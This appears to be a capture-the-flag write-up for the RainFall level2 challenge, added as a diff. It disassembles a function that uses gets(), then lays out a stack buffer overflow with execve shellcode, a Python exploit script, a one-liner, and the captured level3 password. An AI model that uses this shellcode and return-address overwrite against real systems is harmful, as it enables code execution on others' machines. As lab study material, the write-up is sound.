@@ -1,0 +1,190 @@
+# ------------------------------------------------------------------------
+# `p()' function disassembly
+# ------------------------------------------------------------------------
+
+    080484d4 <p>:
+     80484d4:	55                   	push   ebp
+     80484d5:	89 e5                	mov    ebp,esp
+     80484d7:	83 ec 68             	sub    esp,0x68
+     80484da:	a1 60 98 04 08       	mov    eax,ds:0x8049860
+     80484df:	89 04 24             	mov    DWORD PTR [esp],eax
+     80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
+     80484e7:	8d 45 b4             	lea    eax,[ebp-0x4c]
+     80484ea:	89 04 24             	mov    DWORD PTR [esp],eax
+     80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
+     80484f2:	8b 45 04             	mov    eax,DWORD PTR [ebp+0x4]
+     80484f5:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
+     80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
+     80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
+     8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000
+     8048505:	75 20                	jne    8048527 <p+0x53>
+     8048507:	b8 20 86 04 08       	mov    eax,0x8048620
+     804850c:	8b 55 f4             	mov    edx,DWORD PTR [ebp-0xc]
+     804850f:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
+     8048513:	89 04 24             	mov    DWORD PTR [esp],eax
+     8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
+     804851b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
+     8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
+     8048527:	8d 45 b4             	lea    eax,[ebp-0x4c]
+     804852a:	89 04 24             	mov    DWORD PTR [esp],eax
+     804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
+     8048532:	8d 45 b4             	lea    eax,[ebp-0x4c]
+     8048535:	89 04 24             	mov    DWORD PTR [esp],eax
+     8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
+     804853d:	c9                   	leave  
+     804853e:	c3                   	ret    
+
+# ------------------------------------------------------------------------
+# Obtain the next password
+# ------------------------------------------------------------------------
+
+we remember that the level0 binary, lauches a shell via the `execv()' function,
+we also remember that the level1 binary, runs a shell using the `system()' function
+.. unfortunately the level2 binary does not contain any functions that could launch a shell,
+that means we'll have to use shell code injection in order to get the next flag;
+
+the victim program uses the `gets()' function which is vulnerable to the buffer overflow attack;
+we notice that when given a sufficiently large input buffer (76 + '\n' characters or larger) the program crashes.
+
+by inspecting the program via gdb and objdump, we're able to figure out the structure of our attack buffer
+
+for a successfull exploit, our input must be 84 bytes long or larger
+
+attack buffer/stack layout:
+ A     B      C      D      E
+[0:64][64:68][68:76][76:80][80:84]
+
+- section A is good for shell code injection, because it can hold our shell code
+- section B is overwritten after the `gets()` call:
+        ;0x80484f5 <p+33>:	mov    DWORD PTR [ebp-0xc],eax   
+- section C is too small therefore unused
+- section D contains initial EBP register value (saved at the beginning of function at restored via `leave' instruction)
+- section E is the return address to the caller function
+
+what is important to us is section A where we can insert our shell code
+and section E where we overwrite the return address,
+normally the function would return to `main()' which called it,
+however we're going to overwrite that address and have our shell code execute instead
+
+# ------------------------------------------------------------------------
+# creating the shell code
+# ------------------------------------------------------------------------
+
+here is a simple asm program that will execute '/bin//sh'
+
+execve() function prototype:
+       int execve(const char *filename, char *const argv[],
+                  char *const envp[]);
+
+by convention, on 32 bit linux systems,
+when performing a system call to kernel,
+eax register has the system call number, for `execve' its 11
+ebx register has the 1st parameter, ecx has 2nd paramter, edx has 3rd parameter
+and to execute the syscall we do `int 80h`
+
+unix syscalls for 32 bit systems here:
+    /usr/include/i386-linux-gnu/asm/unistd_32.h
+
+; ------------------------------------------------------------------------
+    global  main
+    section .text
+    main:
+        xor     edx, edx                ; execve 3rd parameter = envp, NULL
+        xor     ecx, ecx                ; execve 2nd parameter = argv, NULL
+        push    ecx                     
+        push    '//sh'                  ; after the 3 push instructions, the stack will contain
+        push    '/bin'                  ; db '/bin//sh',0,0,0,0
+        xor     eax, eax
+        mov     al, 11                  ; execve syscall number from unistd
+        mov     ebx, esp                ; execve 1st parameter = name of executable, which we pushed onto stack
+        and     esp, 0xfffffff0         ; align stack
+        int     0x80                    ; syscall
+; ------------------------------------------------------------------------
+
+compile:
+    nasm -f elf32 shell.asm
+    gcc -o shell shell.o
+
+and it generates the following byte code:
+
+NOTE: it is important that the shell byte code does not contain any null bytes,
+because the `gets()` function treats the null bytes as line terminators and truncates the remainder
+
+disassemble:
+    objdump -d -M intel shell | grep -i '<main>' -A12
+
+:	31 d2                	xor    edx,edx
+:	31 c9                	xor    ecx,ecx
+:	51                   	push   ecx
+:	68 2f 2f 73 68       	push   0x68732f2f
+:	68 2f 62 69 6e       	push   0x6e69622f
+:	31 c0                	xor    eax,eax
+:	b0 0b                	mov    al,0xb
+:	89 e3                	mov    ebx,esp
+:	83 e4 f0             	and    esp,0xfffffff0
+:	cd 80                	int    0x80
+
+or in linear fashion:
+    31 d2 31 c9 51 68 2f 2f 73 68 68 2f 62 69 6e 31 c0 b0 0b 89 e3 83 e4 f0 cd 80
+
+for convenience reasons, we're gonna use python to echo our shell code
+we'll simply add a backslash X (`\x'):
+
+    \x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80
+
+# ------------------------------------------------------------------------
+# overwriting the return address of the `p()' function
+# ------------------------------------------------------------------------
+
+- we know that we want our shell code in the first 64 bytes of our attack buffer,
+since the shell code is only 26 bytes long, we need some padding,
+we could pad the front of the shell code with `\x90' bytes which is the `nop' instruction
+or we could pad the back with any byte sequence,
+
+- the other important part is the return address of the function which is at address [80:84] of our buffer (four bytes)
+we can not have a return address that points to the stack itself because the program has an explicit check at 0x8048500
+and if it detects the return address being on the stack then instead it prints a message via `printf()' and exits
+
+however, the program copies the input buffer via `strdup()' on line 0x8048538,
+in our tests the return value of `strdup()' was always 0x804a008
+this is one candidate for our return value;
+we know that the return value of `strdup()' is in register eax at the time of `ret' instruction
+we could also change the return address to anywhere in the code where there is either a `call eax` or `jmp eax`
+a quick search reveals two additional options:
+
+    objdump -d -M intel /home/user/level2/level2 | grep -i 'call' | grep -i 'eax'
+    --    
+     80484cf:	ff d0                	call   eax
+     80485eb:	ff d0                	call   eax
+
+so 0x080484cf and 0x080485eb are also valid candidates for our return address,
+
+now we can assemble our final attack buffer:
+- bytes[0:26]   : shell code
+- bytes[26:80]  : arbitrary data
+- bytes[80:84]  : new return address 0x080484cf
+
+; -----------------------------------------------------------------------
+#!/usr/bin/python
+sh = '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'
+print(sh + (80 - len(sh)) * 'A' + '\x08\x04\x84\xcf'[::-1])
+; -----------------------------------------------------------------------
+
+and to run it:
+    level2@RainFall:/tmp$ (./exploit.py ; cat) | /home/user/level2/level2
+
+the exploit will launch /bin//sh and we can get the flag:
+cat /home/user/level3/.pass
+
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+
+here is a convenient one-liner:
+
+(python -c "print('\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80' + 54 * 'A' + '\x08\x04\x84\xcf'[::-1])" ; cat) | /home/user/level2/level2
+
+
+# ------------------------------------------------------------------------
+# Recreate the exploitable binary
+# ------------------------------------------------------------------------
+
